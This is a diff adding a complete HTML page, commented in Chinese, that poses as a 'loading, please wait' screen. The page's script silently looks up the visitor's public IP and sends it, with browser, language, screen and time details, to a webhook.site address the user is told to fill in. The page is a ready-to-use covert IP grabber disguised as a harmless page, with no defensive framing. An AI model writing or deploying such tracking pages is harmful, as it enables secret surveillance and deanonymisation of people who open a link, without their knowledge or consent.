@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>正在加载...</title>
+    <style>
+        body { background-color: #f4f4f4; text-align: center; padding-top: 20vh; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>正在为您加载内容，请稍候...</h2>
+
+    <script>
+        // 替换为你自己的 webhook.site URL
+        const webhookUrl = "https://webhook.site/替换成你的UUID";
+        
+        // 获取公网 IP 的免费接口
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const targetData = {
+                    ip: data.ip,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: window.screen.width + "x" + window.screen.height,
+                    time: new Date().toLocaleString()
+                };
+                
+                // 把抓到的信息发到你的后台
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(targetData)
+                });
+            });
+    </script>
+</body>
+</html>
